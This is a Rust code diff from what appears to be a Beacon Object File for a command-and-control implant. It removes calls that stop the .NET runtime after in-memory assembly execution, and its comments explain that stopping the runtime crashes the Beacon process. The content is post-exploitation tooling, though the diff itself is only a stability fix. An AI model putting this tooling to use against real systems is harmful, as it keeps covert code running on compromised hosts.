@@ -35,16 +35,13 @@ const V4_VERSION: &[u16] = &[
     b'3' as u16, b'0' as u16, b'3' as u16, b'1' as u16, b'9' as u16, 0,
 ];
 
-unsafe fn stop_clr(host: &ComPtr<ICorRuntimeHost>) {
-    unsafe {
-        let h = host.as_raw();
-        let hr = ((*(*h).vtbl).stop)(h as *mut c_void);
-        #[cfg(feature = "debug-io")]
-        rustbof::eprintln!("[dbg] clr stop hr={:#010x}", hr as u32);
-        #[cfg(not(feature = "debug-io"))]
-        let _ = hr;
-    }
-}
+// stop_clr removed in v0.4.1 — calling ICorRuntimeHost::Stop() in inline
+// mode (BOF inside Beacon's process) leaves CLR modules with inconsistent
+// state and crashes Beacon on the next CLR-touching code path. In
+// sacrificial mode it was redundant (postex_exit → ExitProcess kills CLR
+// anyway). Keeping the CLR alive across inline invocations is now the
+// model — AppDomain GC handles per-call cleanup, ComPtr drops handle the
+// host ref-count.
 
 /// NetFx4 orchestrator (single-file): byte[] load + invoke.
 #[allow(clippy::too_many_arguments)]
@@ -86,9 +83,24 @@ pub unsafe fn run(
         crate::flush::do_flush(&domain, "post", &handle_hex);
         crate::dlog2(b"[netfx]   flush(post) returned");
 
-        crate::dlog2(b"[netfx] stop_clr");
-        stop_clr(&host);
-        crate::dlog2(b"[netfx]   stop_clr returned");
+        // NOTE: Do NOT call ICorRuntimeHost::Stop() here.
+        //
+        // Stop() hard-terminates the CLR execution engine. In the
+        // sacrificial path this is redundant — the process is about to
+        // exit via postex_exit → ExitProcess. In the inline path
+        // (BOF inside Beacon's own process) it is HARMFUL: Stop()
+        // leaves CLR modules loaded with inconsistent state, so the
+        // next inline execute-assembly call (or any code in Beacon
+        // that happens to touch CLR) crashes the Beacon process.
+        //
+        // Letting the AppDomain go out of scope is safe — GC will
+        // collect managed objects. CLR stays alive across inline
+        // invocations and can be re-used by subsequent calls.
+        //
+        // The `host` ComPtr drops here (release on the ICorRuntimeHost
+        // proxy ref-count) but the CLR engine itself remains.
+        let _ = &host;
+        crate::dlog2(b"[netfx]   (skipped stop_clr; see comment)");
         result
     }
 }
@@ -132,7 +144,10 @@ pub unsafe fn run_multi(
         let assembly = load_assembly(&domain, main_bytes)?;
         let result = invoke(&assembly, asm_args, entry_point_flag);
         crate::flush::do_flush(&domain, "post", &handle_hex);
-        stop_clr(&host);
+        // No stop_clr — same reason as in run(). Keep CLR alive for
+        // subsequent inline invocations; sacrificial path exits via
+        // ExitProcess anyway.
+        let _ = &host;
         result
     }
 }
